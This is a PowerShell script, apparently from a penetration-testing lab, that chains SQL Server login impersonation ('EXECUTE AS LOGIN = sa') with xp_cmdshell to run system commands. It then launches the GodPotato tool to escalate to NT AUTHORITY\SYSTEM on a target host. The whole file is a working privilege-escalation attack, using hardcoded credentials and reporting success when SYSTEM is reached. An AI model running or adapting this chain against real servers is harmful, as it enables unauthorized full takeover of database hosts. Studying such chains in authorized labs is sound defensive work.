[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Server = "192.168.77.22",
    [Parameter(Mandatory=$false)]
    [string]$Username = "child.cadre.local\analyst_t1",
    [Parameter(Mandatory=$false)]
    [string]$Password = "T13r_An@lyst!"
)
$ErrorActionPreference = "Stop"
$connStr = "Server=$Server;Database=master;Integrated Security=false;User ID=analyst_t1;Password=$Password;TrustServerCertificate=True;"
$gpPath = "C:\Windows\Temp\cadre-tools\GodPotato.exe"

try {
    Add-Type -AssemblyName System.Data
    $conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
    $conn.Open()
    Write-Output "SQL_OK: connected to $Server as analyst_t1"

    $cmd = $conn.CreateCommand()
    $cmd.CommandText = "EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin'); REVERT"
    $isSysadmin = $cmd.ExecuteScalar()
    Write-Output "sysadmin_membership=$isSysadmin"

    function Invoke-SqlCmd($sql) {
        $c = $conn.CreateCommand()
        $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
        $c.ExecuteNonQuery() | Out-Null
    }

    function Invoke-SqlReader($sql) {
        $c = $conn.CreateCommand()
        $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
        $reader = $c.ExecuteReader()
        $out = @()
        while ($reader.Read()) {
            if ($reader.IsDBNull(0)) { continue }
            $out += $reader.GetString(0)
        }
        $reader.Close()
        return $out
    }

    $r = Invoke-SqlReader "EXEC master..xp_cmdshell 'whoami'"
    $r | ForEach-Object { Write-Output "xp_cmdshell: $_" }

    $priv = Invoke-SqlReader "EXEC master..xp_cmdshell 'whoami /priv | findstr SeImpersonatePrivilege'"
    $priv | ForEach-Object { Write-Output "priv: $_" }

    # Avoid quoting nightmare by writing a temp .cmd file via xp_cmdshell, then invoke GodPotato with the file path.
    $cmdPath = "C:\Windows\Temp\cadre-tools\gp.cmd"
    Invoke-SqlCmd "EXEC master..xp_cmdshell 'echo cmd /c whoami > $cmdPath'"

    $check = Invoke-SqlReader "EXEC master..xp_cmdshell 'if exist $gpPath (echo EXISTS) else (echo MISSING)'"
    $check | ForEach-Object { Write-Output "check: $_" }

    $sys = Invoke-SqlReader "EXEC master..xp_cmdshell '$gpPath -cmd $cmdPath'"
    $sys | ForEach-Object { Write-Output "godpotato: $_" }

    if ($sys -match 'nt authority\\system') {
        Write-Output "T043_OK: SYSTEM on mbr01 via SQL impersonation + GodPotato"
    } else {
        Write-Output "T043_INFO: GodPotato completed; verify output above"
    }

    $conn.Close()
} catch {
    Write-Output "SQL_FAIL: $($_.Exception.Message)"
    exit 1
}
